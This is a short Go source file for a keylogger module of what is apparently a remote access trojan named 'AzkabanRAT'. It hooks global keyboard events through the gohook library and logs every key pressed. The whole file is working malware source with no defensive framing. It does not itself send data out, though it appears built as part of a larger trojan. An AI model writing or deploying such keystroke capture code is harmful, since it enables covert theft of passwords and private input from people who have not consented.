package keylogger

import (
    "fmt"
    "log"

    hook "github.com/robotn/gohook"
)

func StartLogging() {
    fmt.Println("[AzkabanRAT] Keylogger is capturing strokes...")

    events := hook.Start()
    defer hook.End()

    for ev := range events {
        if ev.Kind == hook.KeyDown {
            log.Printf("[KEY] %v\n", ev.Keychar)
        }
    }
}
